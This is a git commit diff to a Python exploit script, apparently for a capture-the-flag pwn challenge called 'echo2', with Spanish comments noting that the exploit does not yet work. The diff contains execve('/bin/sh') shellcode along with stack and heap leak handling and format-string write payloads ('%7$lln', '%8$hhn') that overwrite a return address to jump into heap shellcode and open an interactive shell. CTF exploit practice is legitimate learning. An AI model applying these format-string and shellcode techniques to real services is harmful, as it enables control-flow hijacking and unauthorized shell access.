8bbbd06afe032e45eeb90589d930ae9cf4651b39
physics-sp <physics-sp@protonmail.com>
2019-03-13 15:00:44 -0300

    exploit listo pero no funciona... el shellcode desaparece...

--- echo2/exp.py
+++ echo2/exp.py
@@ -15,7 +15,7 @@ nombre = 'physics'
 """
 # http://shell-storm.org/shellcode/files/shellcode-603.php
 shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
-
+shellcode = "A" * 20
 objo = 0x602098
 
 def main():
@@ -31,7 +31,7 @@ def main():
 	line = conn.recvline()
 	leak = int(line[2:], 16)
 	print 'stack leak:' + hex(leak)
-	ret_addr = leak - 224
+	ret_addr = leak - 216
 	print 'main ret addr:' + hex(ret_addr)
 	print ''
 	conn.recvuntil('> ')
@@ -50,7 +50,7 @@ def main():
 	print 'heap leak:' + hex(leak)
 	shellcode_addr = leak + 0x30
 	if len(hex(shellcode_addr)) > 8:
-		print 'shellcode addr too long...'
+		print 'try again'
 		return
 	print 'shellcode addr:' + hex(shellcode_addr)
 	print ''
@@ -59,42 +59,42 @@ def main():
 	# place shellcode on heap
 	conn.sendline('3')
 	conn.sendline( shellcode )
-	print 'shellcode written'
-	print ''
 	conn.recvuntil('> ')
 
 	# overwrite ret addr
-	sh_bytes = hex(shellcode_addr)[2:]
-	b1 = (1, int(sh_bytes[0:2], 16))
-	b2 = (2, int(sh_bytes[2:4], 16))
-	b3 = (3, int(sh_bytes[4:6], 16))
-	sh_bytes = [b1, b2, b3]
-	sh_bytes.sort(key=lambda x: x[1])
-
-	#pos:     6                   7                   8
-	#payload = p64(ret_addr + 0) + p64(ret_addr + 1) + p64(ret_addr + 2)
-
-	#num_print = sh_bytes[0][1]
-	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[0][0] + 5)
-	#num_print = sh_bytes[1][1] - sh_bytes[0][1]
-	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[1][0] + 5)
-	#num_print = sh_bytes[2][1] - sh_bytes[1][1]
-	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[2][0] + 5)
 
 	conn.sendline('2')
 	conn.recvuntil(nombre)
-	payload = '%7$lln  '
+	payload  = '%7$lln  '
 	payload += p64(ret_addr)
-	conn.sendline( payload ) # el payload no puede superar los 32 bytes...
+	conn.sendline( payload )
+	conn.recvuntil('> ')
+
+	sh_bytes = hex(shellcode_addr)[2:]
+	b1 = (2, int(sh_bytes[0:2], 16))
+	b2 = (1, int(sh_bytes[2:4], 16))
+	b3 = (0, int(sh_bytes[4:6], 16))
+	sh_bytes = [b1, b2, b3]
+	#sh_bytes.sort(key=lambda x: x[1])
+
+	for sh_byte in sh_bytes:
+		pos, lenght = sh_byte
+		if lenght < 8:
+			print 'try again'
+			return
+		else:
+			conn.sendline('2')
+			conn.recvuntil(nombre)
+			print 'escribo:' + hex(lenght)
+			extra = len(str(lenght))
+			payload  = '%{:d}x'.format(lenght - (8 - extra))
+			payload += ' ' * (8 - extra)
+			payload += '%8$hhn'
+			payload += p64(ret_addr +  pos)
+			conn.sendline( payload )
+			conn.recvuntil('> ')
+	conn.sendline( '4\ny' )
 	conn.interactive()
-	return
-	num_print = sh_bytes[0][1]
-	payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[0][0] + 5)
-
-	payload += '%{:d}x%6$n'.format(100)#shellcode_addr)
-	assert len(payload) <= 32
-
-
 
 if __name__ == '__main__':
 	try:
